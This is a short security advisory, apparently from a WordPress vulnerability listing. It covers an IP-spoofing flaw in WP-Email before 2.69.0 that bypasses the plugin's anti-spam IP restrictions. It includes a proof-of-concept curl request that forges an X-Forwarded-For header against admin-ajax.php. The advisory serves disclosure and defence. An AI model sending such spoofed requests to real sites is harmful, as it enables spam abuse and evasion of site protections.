## WordPress Plugin Vulnerabilities

# WP-Email < 2.69.0 - Anti-Spam Protection Bypass via IP Spoofing

### Description

The plugin prioritizes getting a visitor's IP from certain HTTP headers over PHP's REMOTE\_ADDR, which makes it possible to bypass IP-based anti-spamming restrictions.

### Proof of Concept

Set HTTP\_CLIENT\_IP, HTTP\_X\_FORWARDED\_FOR or any of the other headers used in get\_ipaddress().
curl 'http://vulnerable-site.tld/wp-admin/admin-ajax.php' -X POST -H 'X-Forwarded-For: 127.0.0.1' --data-raw 'action=email&yourname=admin&youremail=attack@attack.me&yourremarks=asdasd&friendname=Igor Popov&friendemail=ip@internet.com&imageverify=ME5RJ&p=177&wp-email\_nonce=646bfc1f45'
